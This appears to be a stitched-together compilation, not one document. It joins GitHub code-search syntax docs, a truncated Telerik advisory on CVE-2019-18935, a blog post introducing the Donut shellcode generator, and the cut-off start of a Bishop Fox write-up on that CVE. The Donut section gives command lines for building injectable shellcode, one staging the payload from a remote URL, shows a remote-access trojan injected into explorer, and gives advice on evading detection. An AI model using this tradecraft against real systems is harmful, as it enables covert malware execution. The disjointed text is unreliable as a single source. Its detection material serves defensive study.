# Understanding GitHub Code Search syntax

You can build search queries for the results you want with specialized code qualifiers, regular expressions, and boolean operations.

## [About code search query structure](#about-code-search-query-structure)

The search syntax in this article only applies to searching code with GitHub code search. Note that the syntax and qualifiers for searching for non-code content, such as issues, users, and discussions, is not the same as the syntax for code search. For more information on non-code search, see [About searching on GitHub](/en/search-github/getting-started-with-searching-on-github/about-searching-on-github) and [Searching on GitHub](/en/search-github/searching-on-github).

Search queries consist of search terms, comprising text you want to search for, and qualifiers, which narrow down the search.

A bare term with no qualifiers will match either the content of a file or the file's path.

For example, the following query:

```
http-push

```

The above query will match the file `docs/http-push.txt`, even if it doesn't contain the term `http-push`. It will also match a file called `example.txt` if it contains the term `http-push`.

You can enter multiple terms separated by whitespace to search for documents that satisfy both terms.

For example, the following query:

```
sparse index

```

The search results would include all documents containing both the terms `sparse` and `index`, in any order. As examples, it would match a file containing `SparseIndexVector`, a file with the phrase `index for sparse trees`, and even a file named `index.txt` that contains the term `sparse`.

Searching for multiple terms separated by whitespace is the equivalent to the search `hello AND world`. Other boolean operations, such as `hello OR world`, are also supported. For more information about boolean operations, see [Using boolean operations](#using-boolean-operations).

Code search also supports searching for an exact string, including whitespace. For more information, see [Query for an exact match](#query-for-an-exact-match).

You can narrow your code search with specialized qualifiers, such as `repo:`, `language:` and `path:`. For more information on the qualifiers you can use in code search, see [Using qualifiers](#using-qualifiers).

You can also use regular expressions in your searches by surrounding the expression in slashes. For more information on using regular expressions, see [Using regular expressions](#using-regular-expressions).

## [Query for an exact match](#query-for-an-exact-match)

To search for an exact string, including whitespace, you can surround the string in quotes. For example:

```
"sparse index"

```

You can also use quoted strings in qualifiers, for example:

```
path:git language:"protocol buffers"

```
## [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)

To search for code containing a quotation mark, you can escape the quotation mark using a backslash. For example, to find the exact string `name = "tensorflow"`, you can search:

```
"name = \"tensorflow\""

```

To search for code containing a backslash, `\`, use a double backslash, `\\`.

The two escape sequences `\\` and `\"` can be used outside of quotes as well. No other escape sequences are recognized, though. A backslash that isn't followed by either `"` or `\` is included in the search, unchanged.

Additional escape sequences, such as `\n` to match a newline character, are supported in regular expressions. See [Using regular expressions](#using-regular-expressions).

## [Using boolean operations](#using-boolean-operations)

Code search supports boolean expressions. You can use the operators `AND`, `OR`, and `NOT` to combine search terms.

By default, adjacent terms separated by whitespace are equivalent to using the `AND` operator. For example, the search query `sparse index` is the same as `sparse AND index`, meaning that the search results will include all documents containing both the terms `sparse` and `index`, in any order.

To search for documents containing either one term or the other, you can use the `OR` operator. For example, the following query will match documents containing either `sparse` or `index`:

```
sparse OR index

```

To exclude files from your search results, you can use the `NOT` operator. For example, to exclude files in the `__testing__` directory, you can search:

```
"fatal error" NOT path:__testing__

```

You can use parentheses to express more complicated boolean expressions. For example:

```
(language:ruby OR language:python) AND NOT path:"/tests/"

```
## [Using qualifiers](#using-qualifiers)

You can use specialized keywords to qualify your search.

* [Repository qualifier](#repository-qualifier)
* [Organization and user qualifiers](#organization-and-user-qualifiers)
* [Language qualifier](#language-qualifier)
* [Path qualifier](#path-qualifier)
* [Symbol qualifier](#symbol-qualifier)
* [Content qualifier](#content-qualifier)
* [Is qualifier](#is-qualifier)

### [Repository qualifier](#repository-qualifier)

To search within a repository, use the `repo:` qualifier. You must provide the full repository name, including the owner. For example:

```
repo:github-linguist/linguist

```

To search within a set of repositories, you can combine multiple `repo:` qualifiers with the boolean operator `OR`. For example:

```
repo:github-linguist/linguist OR repo:tree-sitter/tree-sitter

```

Note

Code search does not currently support regular expressions or partial matching for repository names, so you will have to type the entire repository name (including the user prefix) for the `repo:` qualifier to work.

### [Organization and user qualifiers](#organization-and-user-qualifiers)

To search for files within an organization, use the `org:` qualifier. For example:

```
org:github

```

To search for files within a personal account, use the `user:` qualifier. For example:

```
user:octocat

```

Note

Code search does not currently support regular expressions or partial matching for organization or user names, so you will have to type the entire organization or user name for the qualifier to work.

### [Language qualifier](#language-qualifier)

To narrow down to a specific languages, use the `language:` qualifier. For example:

```
language:ruby OR language:cpp OR language:csharp

```

For a complete list of supported language names, see [languages.yaml](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) in [github-linguist/linguist](https://github.com/github-linguist/linguist). If your preferred language is not on the list, you can open a pull request to add it.

### [Path qualifier](#path-qualifier)

To search within file paths, use the `path:` qualifier. This will match files containing the term anywhere in their file path. For example, to find files containing the term `unit_tests` in their path, use:

```
path:unit_tests

```

The above query will match both `src/unit_tests/my_test.py` and `src/docs/unit_tests.md` since they both contain `unit_test` somewhere in their path.

To match only a specific filename (and not part of the path), you could use a regular expression:

```
path:/(^|\/)README\.md$/

```

Note that the `.` in the filename is escaped, since `.` has special meaning for regular expressions. For more information about using regular expressions, see [Using regular expressions](#using-regular-expressions).

You can also use some limited glob expressions in the `path:` qualifier.

For example, to search for files with the extension `txt`, you can use:

```
path:*.txt

```

To search for JavaScript files within a `src` directory, you could use:
```
path:src/*.js

```

* By default, glob expressions are not anchored to the start of the path, so the above expression would still match a path like `app/src/main.js`. But if you prefix the expression with `/`, it will anchor to the start. For example:

  ```
  path:/src/*.js

  ```
* Note that `*` doesn't match the `/` character, so for the above example, all results will be direct descendants of the `src` directory. To match within subdirectories, so that results include deeply nested files such as `/src/app/testing/utils/example.js`, you can use `**`. For example:

  ```
  path:/src/**/*.js

  ```

You can also use the `?` global character. For example, to match the path `file.aac` or `file.abc`, you can use:

```
path:*.a?c

```

To search for a filename which contains a special character like `\*` or `?`, just use a quoted string:
```
path:"file?"

```

Glob expressions are disabled for quoted strings, so the above query will only match paths containing the literal string `file?`.

### [Symbol qualifier](#symbol-qualifier)

You can search for symbol definitions in code, such as function or class definitions, using the `symbol:` qualifier. Symbol search is based on parsing your code using the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, so no extra setup or build tool integration is required.

For example, to search for a symbol called `WithContext`:

```
language:go symbol:WithContext

```

In some languages, you can search for symbols using a prefix (e.g. a prefix of their class name). For example, for a method `deleteRows` on a struct `Maint`, you could search `symbol:Maint.deleteRows` if you are using Go, or `symbol:Maint::deleteRows` in Rust.

You can also use regular expressions with the symbol qualifier. For example, the following query would find conversions people have implemented in Rust for the `String` type:

```
language:rust symbol:/^String::to_.*/

```

Note that this qualifier only searches for definitions and not references, and not all symbol types or languages are fully supported yet. Symbol extraction is supported for the following languages:

* Bash
* C
* C#
* C++
* CodeQL
* Elixir
* Go
* JSX
* Java
* JavaScript
* Lua
* PHP
* Protocol Buffers
* Python
* R
* Ruby
* Rust
* Scala
* Starlark
* Swift
* Typescript

We are working on adding support for more languages. If you would like to help contribute to this effort, you can add support for your language in the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, upon which symbol search is based.

### [Content qualifier](#content-qualifier)

By default, bare terms search both paths and file content. To restrict a search to strictly match the content of a file and not file paths, use the `content:` qualifier. For example:

```
content:README.md

```

This query would only match files containing the term `README.md`, rather than matching files named `README.md`.

### [Is qualifier](#is-qualifier)

To filter based on repository properties, you can use the `is:` qualifier. `is:` supports the following values:

* `archived`: restricts the search to archived repositories.
* `fork`: restricts the search to forked repositories.
* `vendored`: restricts the search to content detected as vendored.
* `generated`: restricts the search to content detected as generated.

For example:

```
path:/^MIT.txt$/ is:archived

```

Note that the `is:` qualifier can be inverted with the `NOT` operator. To search for non-archived repositories, you can search:

```
log4j NOT is:archived

```

To exclude forks from your results, you can search:

```
log4j NOT is:fork

```
## [Using regular expressions](#using-regular-expressions)

Code search supports regular expressions to search for patterns in your code. You can use regular expressions in bare search terms as well as within many qualifiers, by surrounding the regex in slashes.

For example, to search for the regular expression `sparse.*index`, you would use:

```
/sparse.*index/

```

Note that you'll have to escape any forward slashes within the regular expression. For example, to search for files within the `App/src` directory, you would use:

```
/^App\/src\//

```

Inside a regular expression, `\n` stands for a newline character, `\t` stands for a tab, and `\x{hhhh}` can be used to escape any Unicode character. This means you can use regular expressions to search for exact strings that contain characters that you can't type into the search bar.

Most common regular expressions features work in code search. However, "look-around" assertions are not supported.

## [Separating search terms](#separating-search-terms)

All parts of a search, such as search terms, exact strings, regular expressions, qualifiers, parentheses, and the boolean keywords `AND`, `OR`, and `NOT`, must be separated from one another with spaces. The one exception is that items inside parentheses, `(` `)`, don't need to be separated from the parentheses.

If your search contains multiple components that aren't separated by spaces, or other text that does not follow the rules listed above, code search will try to guess what you mean. It often falls back on treating that component of your query as the exact text to search for. For example, the following query:

```
printf("hello world\n");

```

Code search will give up on interpreting the parentheses and quotes as special characters and will instead search for files containing that exact code.

If code search guesses wrong, you can always get the search you wanted by using quotes and spaces to make the meaning clear.

## [Case sensitivity](#case-sensitivity)

By default, code search is case-insensitive, and results will include both uppercase and lowercase results. You can do case-sensitive searches by using a regular expression with case insensitivity turned off. For example, to search for the string "True", you would use:

```
/(?-i)True/

```

# [Allows JavaScriptSerializer Deserialization](#allows-javascriptserializer-deserialization)

## [Problem](#problem)

Exploiting .NET JavaScriptSerializer Deserialization ([CVE-2019-18935](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935)) issue through RadAsyncUpload can lead to executing malicious code on the server in the context of the w3wp.exe process.

## [Prerequisites for an Attack](#prerequisites-for-an-attack)

* An attacker can break the RadAsyncUpload encryption (or have prior knowledge of your custom encryption keys) and stage a malicious request.
* The type whitelisting feature of RadAsyncUpload is not enabled (see [AllowedCustomMetaDataTypes appSettings key](/products/aspnet-ajax/documentation/controls/asyncupload/security#allowedcustommetadatatypes)).

## [Solution](#solution)

To make sure you are not vulnerable we recommend that you upgrade to R1 2020 or later as shown in the diagram below:

# Donut - Injecting .NET Assemblies as Shellcode

*TLDR: You can now inject .NET Assemblies into Windows processes using this repo: https://github.com/TheWover/donut/*

# Advancing Tradecraft - Context

Offensive and red team tradecraft have changed significantly in the past year. As anti-malware systems improve their capability to detect and deter offensive tools, attackers are shifting their focus to technologies that are not observed by AV. Currently, that means operating entirely in memory and avoiding dropping files onto disk. In the Windows world, the .NET Framework provides a convenient mechanism for this. It is, however, severely restricted in that .NET programs cannot be injected directly into remote processes. In this article, we will address this issue by describing how to inject .NET code into processes via shellcode.

## .NET Primer

Before we begin, you must understand a few important components of .NET.

* [Common Language Runtime](https://docs.microsoft.com/en-us/dotnet/standard/clr "Common Language Runtime"): Like Java, .NET uses a runtime environment (or “virtual machine”) to interpret code at runtime. All .NET Code is compiled from an intermediate language to native code “Just-In-Time” before execution.
* [Common Intermediate Language](https://docs.microsoft.com/en-us/dotnet/standard/managed-code "Common Intermediate Language"): Speaking of an intermediate language, .NET uses CIL (also known as MSIL). All .NET languages (of which there are many) are “assembled” to this intermediate language. CIL is a generic object-oriented assembly language that can be interpreted into machine code for any hardware architecture. As such, the designers of .NET languages do not need to design their compilers around the architectures they will run on. Instead, they merely need to design it to compile to one language: CIL.
* [.NET Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/assemblies-in-the-common-language-runtime ".NET Assemblies"): .NET applications are packaged into .NET Assemblies. They are so called because the code from your language of choice has been “assembled” into CIL but not truly compiled. Assemblies use an extension of the PE format and are represented as either an EXE or a DLL that contains CIL rather than native machine code.
* [Application Domains](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/application-domains "Application Domains"): Assemblies are run inside of a safe “box” known as an Application Domain. Multiple Assemblies can exist within an AppDomain, and multiple AppDomains can exist within a process. AppDomains are intended to provide the same level of isolation between executing Assemblies as is normally provided for processes. Threads may move between AppDomains and can share objects through marshalling and delegates.

## Current state of .NET Tradecraft

Currently, .NET tradecraft is limited to post-exploitation execution by one of two main ways:

* Assembly.Load(): The .NET Framework’s standard library includes an API for [code reflection](https://en.wikipedia.org/wiki/Reflection_%28computer_programming%29). This Reflection API includes System.Reflection.Assembly.Load, which can be used to load .NET programs from memory. In less than five lines of code, you may load a .NET DLL or EXE from memory and execute it.
* execute-assembly: In Cobalt Strike 3.11, Raphael Mudge introduced a command called ‘execute-assembly’ that ran .NET Assemblies from memory as if they were run from disk. This command introduced the world to .NET tradecraft and signalled the shift to [Bringing Your Own Land](https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html).

However, both execution vectors produce challenges for red teams seeking to develop flexible TTPs.

## Assembly.Load

While the Reflection API is very versatile and can be useful in many different ways, it can only run code in the current process. No support is provided for running payloads in remote processes.

## execute-assembly

The main problem with execute-assembly is that it executes the same way every time. That predictability ensures that it is reliable, but also lets defenders built analytics.

1. A subprocess is created using the *spawnto* executable. Mudge refers to this as a “sacrificial process” because it acts as a host for your payloads, isolating your Beacon’s process from any failure in your code.
2. A reflective DLL is injected into the subprocess to load the .NET Runtime.
3. The reflective DLL loads an intermediate .NET Assembly to handle errors and improve the stability of your payload.
4. The intermediate .NET Assembly loads your .NET Assembly from memory inside the subprocess.
5. The main entry point of your Assembly is invoked along with your command-line arguments.

The result is that execute-assembly *does* allow you to inject your .NET Assembly into a remote process. However, it does not let you inject into a running process or specify how that injection occurs. It is only modular in *what* you can run, not *how* you can run it. The most that you can do is to specify what executable is run for your sacrificial subprocess by changing the *spawnto* variable in your Malleable C2 Profile. execute-assembly also has a hidden size limitation of 1 MB for your payloads, which limits your flexibility in designing post-exploitation tools.

## Moving Forward

To move past these limitations, we need a technique that meets the following requirements:

* Allows you to run .NET code from memory.
* Can work with any Windows process, regardless of its architecture and whether it has the CLR loaded.
* Allows you to inject that code in either a remote (different) process or the local (current) process.
* Allows you to determine in what way that injection occurs.
* Works with multiple types of process injection.

The most flexible type of payload that meets those requirements is shellcode. But you can’t just convert a .NET Assembly to shellcode. They run through a runtime environment, not directly on the hardware. Wouldn’t it be great if we could just inject .NET Assemblies as shellcode? Yes. Yes, it would.

# Introducing Donut

![_config.yml](/images/Introducing_Donut/donut.PNG)

`Shortly before publishing donut, Odzhan and I became aware of another team working on a shellcode generator for .NET Assemblies. They were at the same stage of their project at us. We both agreed that whomever of us published first would ensure that the other received due credit for their work. As soon as they publish their tool, we will update this article with a link. This project is CLRVoyance, published by Accenture:` [Link to the repo.](https://github.com/Accenture/CLRvoyance)

Donut is a shellcode generation tool that creates x86 or x64 shellcode payloads from .NET Assemblies. This shellcode may be used to inject the Assembly into arbitrary Windows processes. Given an arbitrary .NET Assembly, parameters, and an entry point (such as Program.Main), it produces position-independent shellcode that loads it from memory. The .NET Assembly can either be staged from a URL or stageless by being embedded directly in the shellcode. Either way, the .NET Assembly is encrypted with the Chaskey block cipher and a 128-bit randomly generated key. After the Assembly is loaded through the CLR, the original reference is erased from memory to deter memory scanners. The Assembly is loaded into a new Application Domain to allow for running Assemblies in disposable AppDomains.

Donut is currently at version 0.9 (Beta). Please share any issues or suggestions with us as Issues on GitHub. Once we have received feedback, we will release version 1.0. A link to the compiled v0.9 release can be found [here](https://github.com/TheWover/donut/releases/tag/v0.9 "Release 0.9").

This is a joint project between Odzhan and TheWover. Odzhan also created a [blog post](https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/) for v0.9 release.

# How it Works

## Unmanaged Hosting API

Microsoft provides an API known as the [Unmanaged CLR Hosting API](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/). This API allows for unmanaged code (such as C or C++) to host, inspect, configure, and use Common Language Runtimes. It is a legitimate API that can be used for many purposes. Microsoft uses it for several of their products, and other companies use it to design custom loaders for their programs. It can be used to improve performance of .NET applications, create sandboxes, or just do wierd stuff. We do the latter.

One of the things it can do is manually load .NET Assemblies into arbitrary [Application Domains](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/application-domains). It can do this either from disk or from memory. We utilize its capability for loading from memory to load your payload without touching disk.

To see a standalone example of an Unmanaged CLR Hosting Assembly loader, check out Casey Smith’s repo: [AssemblyLoader](https://github.com/caseysmithrc/AssemblyLoader)

## CLR Injection

The first action that donut’s shellcode takes is to load the CLR. Unless the user specifies the exact runtime version to use, v4.0.30319 of the CLR will be used by default, which supports the versions 4.0+ of .NET. If the attempt to load a specific version fails, then donut will attempt to use whichever one is available on the system. Once the CLR is loaded, the shellcode creates a new Application Domain. At this point, the .NET Assembly payload must be obtained. If the user provided a staging URL, then the Assembly is downloaded from it. Otherwise, it is obtained from memory. Either way, it will loaded into the new AppDomain. After the Assembly is loaded but before it is run, the decrypted copy will be released and later freed from memory with VirtualFree to deter memory scanners. Finally, the Entry Point specified by the user will be invoked along with any provided parameters.

If the CLR is already loaded into the host process, then donut’s shellcode will still work. The .NET Assembly will just be loaded into a new Application Domain within the managed process. .NET is designed to allow for .NET Assemblies built for multiple versions of .NET to run simultaneously in the same process. As such, your payload should always run no matter the process’s state before injection.

## Shellcode Generation

The logic above describes how the shellcode generated by donut works. That logic is defined in payload.exe. To get the shellcode, exe2h extracts the compiled machine code from the .text segment in payload.exe and saves it as a C array to a C header file. donut combines the shellcode with a Donut Instance (a configuration for the shellcode) and a Donut Module (a structure containing the .NET assembly, class name, method name and any parameters).

# Using Donut

Donut can be used as-is to generate shellcode from arbitrary .NET Assemblies. Both a Windows EXE and a Python (Python planned for v1.0) script are provided for payload generation. The command-line syntax is as described below.

```
 usage: donut [options] -f <.NET assembly> -c <namespace.class> -m <Method>

       -f <path>            .NET assembly to embed in PIC and DLL.
       -u <URL>             HTTP server hosting the .NET assembly.
       -c <namespace.class> The assembly class name.
       -m <method>          The assembly method name.
       -p <arg1,arg2...>    Optional parameters for method, separated by comma or semi-colon.
       -a <arch>            Target architecture : 1=x86, 2=amd64(default).
       -r <version>         CLR runtime version. v4.0.30319 is used by default.
       -d <name>            AppDomain name to create for assembly. Randomly generated by default.

 examples:

    donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll
    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe -u http://remote_server.com/modules/

```
## Generating Shellcode

To generate shellcode with donut, you must specify a .NET Assembly, an Entry Point, and any parameters that you wish to use. If your Assembly uses the *Test* namespace and includes the *Program* class with the *Main* method, then you would use the following options:

```
donut.exe -f Test.exe -c Test.Program -m Main

```

To generate the same shellcode for 32-bit processes, use the ‘-a’ option:

```
donut.exe -a 1 -f Test.exe -c Test.Program -m Main

```

You may also provide parameters to whatever Entry Point you specify. The max length of each parameter is currently 32 characters. To demonstrate this functionality, you may use the following options and our example Assembly to create shellcode that will spawn a Notepad process and a Calc process:

```
.\donut.exe -f .\DemoCreateProcess\bin\Release\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe

```

When generating shellcode to run an an older Windows machine, you may need it to use v2 of the CLR, rather than v4. v2 works for versions of the .NET Framework <= 3.5, while v4 works for versions >= 4.0. By default, donut uses version 4 of the CLR. You may tell it to use v2 with the ‘-r’ option and specifying “v2.0.50727” as the parameter.

```
.\donut.exe -r v2.0.50727 -f .\DemoCreateProcess\bin\Release\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe

```

The name of the AppDomain for your .NET payload may be specified manually using the ‘-d’ option. By default, it will be randomly generated. You may specify a name.

```
.\donut.exe -d ResourceDomain -r v2.0.50727 -f .\DemoCreateProcess\bin\Release\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe

```

In order to reduce the size of your shellcode (or for many other reasons), you may specify a URL where your payload will be hosted. Donut will produce an encrypted Donut Module with a random name that you should place at the URI you specified. The name and location where you should place it will be printed to your screen when you generate the shellcode.

```
.\donut.exe -u http://remote_server.com/modules/ -d ResourceDomain -r v2.0.50727 -f .\DemoCreateProcess\bin\Release\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe

```
## Demonstrating with SILENTTRINITY

For a demonstration, we will use the [SILENTTRINITY RAT](https://github.com/byt3bl33d3r/SILENTTRINITY "SILENTTRINITY") as a test payload. Since it is the most… ahh… complicated .NET Assembly that I could find, I used it for all of my testing. You may use any standard shellcode injection technique to inject the .NET Assembly. The DonutTest subproject is provided in the repo as an example injector. You may combine it with the DonutTest subproject to test the shellcode generator. In our case, we will first use DonutTest to inject into explorer. We also show what it looks like to use an existing implant to perform further injection using the `boo/shellcode` and `ipy/execute-assembly` post-exploitation modules.

### Generation

First, we will generate a x64 PIC using the SILENTTRINITY DLL. Using PowerShell, we will base64-encode the result and pipe it to our clipboard.

![_config.yml](/images/Introducing_Donut/ST_generate_and_copy.PNG)

Because we don’t know what processes will be available to inject into on-target, we will also generate a x86 PIC just in case we need it.

![_config.yml](/images/Introducing_Donut/ST_generate_and_copy_86.PNG)

If you wanted to, you could use a staging server by providing the URL and copying the Donut Module to the specified location.

![_config.yml](/images/Introducing_Donut/generate_url.PNG)

### Choosing a Host Process

Use ProcessManager, a sub-project provided in the donut repo, to enumerate processes. ProcessManager enumerates all running processes and makes a best effort to obtain information about them. It is specifically designed to aid in determining what process to inject / migrate into. The picture below demonstrates its general usage.

![_config.yml](/images/Introducing_Donut/ProcessManager.JPG)

### Injecting

First, we will use DonutTest to inject into explorer using DonutTest. We pasted the encoded shellcode from above into DonutTest and rebuilt it for our test.

![_config.yml](/images/Introducing_Donut/ST_inject.PNG)

As you can see, the injection was successfull:

![_config.yml](/images/Introducing_Donut/ST_success.PNG)

Now assume we already have an agent running on the machine. We can use SILENTTRINITY’s post-exploitation modules to inject implants into running processes.

![_config.yml](/images/Introducing_Donut/ST_through_agent.png)

## Using as a Library

donut is provided as both dynamic and static libraries for both (*.a* / *.so*) and Windows (*.lib* / *.dll*). It has a simple API that is described in *docs\api.html*. Two exported functions are provided, `int DonutCreate(PDONUT_CONFIG c)` and `int DonutDelete(PDONUT_CONFIG c)` .

## Rebuilding the shellcode

You may easily customize our shellcode to fit your use case. *payload.c* contains the .NET assembly loader, which should successfully compile with both Microsoft Visual Studio and mingw-w64. Make files have been provided for both compilers which will generate x86-64 shellcode by default unless x86 is supplied as a label to nmake/make. Whenever *payload.c* has been changed, recompiling for all architectures is recommended before rebuilding donut.

### Microsoft Visual Studio

Open the x64 Microsoft Visual Studio build environment, switch to the *payload* directory, and type the following:

```
nmake clean -f Makefile.msvc
nmake -f Makefile.msvc

```

This should generate a 64-bit executable (*payload.exe*) from *payload.c*. exe2h will then extract the shellcode from the *.text* segment of the PE file and save it as a C array to *payload\_exe\_x64.h*. When donut is rebuilt, this new shellcode will be used for all payloads that it generates.

To generate 32-bit shellcode, open the x86 Microsoft Visual Studio build environment, switch to the payload directory, and type the following:

```
nmake clean -f Makefile.msvc
nmake x86 -f Makefile.msvc

```

This will save the shellcode as a C array to *payload\_exe\_x86.h*.

### Mingw-w64

Assuming you’re on Linux and *mingw-w64* has been installed from packages or source, you may still rebuild the shellcode using our provided makefile. Change to the *payload* directory and type the following:

```
make clean -f Makefile.mingw
make -f Makefile.mingw

```

Once you’ve recompiled for all architectures, you may rebuild donut.

## Integrating into Tooling

We hope that donut (or something inspired by it) will be integrated into tooling to provide **inject** and **migrate** functionality. To do so, we suggest one of the following methods:

* As an operator, using the generator to manually generate shellcode.
* Generate the shellcode dynamically on your C2 server, pass that down to an existing implant, and inject it into another process.
* Use our dynamic or static libraries.
* As a template for building your own shellcode / generator.
* Use our Python (Python planned for v1.0) extension to script shellcode generation dynamically.

# Advancing Tradecraft

It is our hope that releasing donut to the public will advance offensive and red team tradecraft in several ways:

* Provide red teams and adversary emulators with a means to emulate this technique that threat actors may have developed in secret.
* Provide blue teams a frame of refernce for detecting and mitigating CLR Injection techniques.
* Inspire tool developers to develop new types of techniques and tradecraft.

## Alternative Payloads

The main benefit of using .NET Assemblies as shellcode is that they can now be executed by anything that can execute shellcode on Windows. There are many more ways to inject shellcode than there are to load Assemblies. As such, offensive tool designers no longer need to design their payloads around running .NET. Instead, they may leverage their existing payloads and techniques that use shellcode.

## Injecting .NET At Will / Migration

Donut will also allow the developers of C2 Frameworks / RATs to add migrate-like functionality to their tools. By using Donut as a library (or calling the generator) on the server and then providing the result to an existing agent, it may inject a new instance of itself into another running process. This may also be used to inject arbitrary post-exploitation modules so long as I/O is properly redirected.

## Disposable AppDomains

When donut loads an Assembly, it loads it into a new AppDomain. Unless the user specifies the name of the AppDomain with the ‘-d’ parameter, the AppDomain is given a random name. We specifically designed donut to run payloads in new AppDomains rather than using DefaultDomain. If this does not suit you, you can easily modify payload.c to use the default domain. By running the payload in its own AppDomain, this allows for the development of tools that run post-exploitation modules in disposable AppDomains. Application Domains can be unloaded, but individual Assemblies cannot. Therefore, to unload an Assembly when you are done with it, you must put it into its own AppDomain and unload that instead. A C# agent can have the shellcode generated on its server, inject the result into itself in a new thread, wait for the Assembly to finish executing, then unload the host AppDomain. You could also modify the shellcode itself to perform that role.

## Detecting CLR Injection

One of the companion projects for donut is ModuleMonitor. It uses WMI Event Win32\_ModuleLoadTrace to monitor for module loading. It provides filters, detailed data, and has an option to monitor for CLR Injection attacks.

The CLR Sentry option follows some simple logic: If a process loads the CLR, but the program is not a .NET program, then the CLR has been injected into it.

While useful, there are both false positives and false negatives:

* False Postiive: There are (few) legitimate uses of the Unmanaged CLR Hosting API. If there weren’t, then Microsoft wouldn’t have made it. CLR Sentry will notice every unmanaged program that loads the CLR.
* False Negatives: This will NOT notice injection of .NET code into processes that already have the CLR loaded. So, no use of the Reflection API and not when donut is used to inject shellcode into managed processes.

Please Note: This is intended **only** as a Proof-of-Concept to demonstrate the anomalous behavior produced by CLR injection and how it may be detected. It should not be used in any way in a production environment. You could perform the same logic with the Image Load event for Sysmon or ETW. They would be easier to scale and integrate with enterprise tooling.

I am not a defender, but the following pseudocode is my attempt at an analytic that follows this logic. The DLLs that are associated with the CLR all start with “msco”, such as “mscorlib.dll” and “mscoree.dll”. As such, we watch for their loading, then check if the program that loaded them is a valid .NET Assembly.

```
void CLR_Injection:
    WHEN Image_Load event:
        if event.Module.Name contains "msco*.dll":
        {
            if !(IsValidAssembly(event.Process.FilePath)):
            {
                print "A CLR has been injected into " + event.Process.Id
            }
        }

```

The snippet below represents my implementation of this logic in C#. The full code can be found in ModuleMonitor.

```
//CLR Sentry
//Author: TheWover
 while (true)
        {
            //Get the module load.
            Win32_ModuleLoadTrace trace = GetNextModuleLoad();

            //Split the file path into parts delimited by a '\'
            string[] parts = trace.FileName.Split('\\');

            //Check whether it is a .NET Runtime DLL
            if (parts[parts.Length - 1].Contains("msco"))
            {
                //Get a
                Process proc = Process.GetProcessById((int) trace.ProcessID);

                //Check if the file is a .NET Assembly
                if (!IsValidAssembly(proc.StartInfo.FileName))
                {
                    //If it is not, then the CLR has been injected.
                    Console.WriteLine();

                    Console.WriteLine("[!] CLR Injection has been detected!");

                    //Display information from the event
                    Console.WriteLine("[>] Process {0} has loaded the CLR but is not a .NET Assembly:", trace.ProcessID);
                }
            }
        }

It is important to note that this behaviour represents all CLR Injection techniques, of which there are several. This detection should work for donut, as well as other tools such as Cobalt Strike’s ‘execute-assembly’ command.

## OpSec Considerations

ModuleMonitor demonstrates an important point about CLR Injection: When performed against unmanaged processes, CLR Injection produces highly anomalous process behavior. The loading of a CLR after a process’s initial execution or from unmanaged code is unusual. There are few legitimate use cases. From a defender’s perspective, this allows you to build a analytics that monitor for the behavior described in the section above.

However, as I mentioned, this analytic fails to detect CLR Injection into processes that already have the CLR loaded. As such, an operator could evade the analytic by simply injecting into processes that are already managed. I would recommend the following standard operating procedure:

1. Run ProcessManager from memory to enumerate processes. Take note of which you can inject into.
2. If there are any processes that are already managed, then consider them the set of potential targets.
3. If there are not any managed processes, then all processes are potential targets.
4. Either way, inject / migrate into the process that is most likely to naturally produce network traffic and live the longest.

Or to put it simply:

* Whenever possible, prefer to inject .NET Assemblies into processes that already have the CLR loaded.

# Conclusion

Offensive .NET tradecraft is faced with several important challenges. One of them is the lack of means to inject into remote processes at will. While this can normally be performed with shellcode, there is no way to produce shellcode that can run a .NET Assembly directly on hardware. Any shellcode that runs a .NET Assembly must first bootstrap the Common Language Runtime and load the Assembly through it. Enter Donut. With Donut, we now have a framework for generating flexible shellcode that loads a .NET Assembly from memory. This can be combined with existing techniques and tooling to advance tradecraft in a number of ways. Hopefully, this will break down the current barriers in .NET-based exploitation and provide tool designers with a foundation for crafting more excellent tools.

# CVE-2019-18935: Remote Code Execution via Insecure Deserialization in Telerik UI

By:
[Caleb Gross, Director of Capability Development](https://bishopfox.com/authors/caleb-gross)

![Cartoon hacker finding remote code execution in Telerik UI](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/Bishop-Fox_Blog-Post_Telerik_FI-01_2022-05-18-224348_nhah.jpg)

[Telerik UI for ASP.NET AJAX](https://www.telerik.com/products/aspnet-ajax.aspx) is a widely used suite of UI components for web applications. It insecurely deserializes JSON objects in a manner that results in arbitrary remote code execution on the software's underlying host. The Managed Security Services (MSS) team at Bishop Fox has identified and exploited internet-facing instances of Telerik UI affected by this vulnerability for our clients. Since Telerik has just responded to this issue by releasing a [security advisory for CVE-2019-18935](https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization), we're sharing our knowledge about it here in an effort to raise awareness about the severity of this vulnerability, and to encourage affected users to patch and securely configure this software. Patching instructions are included at the end of this post.

Thanks to Markus Wulftange ([@mwulftange](https://twitter.com/mwulftange)) of Code White GmbH for initially discovering this insecure deserialization vulnerability and for summarizing his research. Thanks also to Paul Taylor [(@bao7uo](https://github.com/bao7uo)) who, after authoring an [exploit](https://github.com/bao7uo) to break encryption for an unrestricted file upload vulnerability, developed an extended custom payload feature that was instrumental in triggering this deserialization vulnerability.

## Vulnerability Details

The following sections will walk through two vulnerabilities in RadAsyncUpload, which is a file handler in Telerik UI for ASP.NET AJAX that enables uploading files asynchronously (i.e., without reloading the existing page). After covering the context of those two CVEs, we’ll dive deeper into the insecure deserialization vulnerability to learn if it affects your system, how the exploit works, and how you can patch systems against this vulnerability.

### Overview of Vulnerabilities in RadAsyncUpload

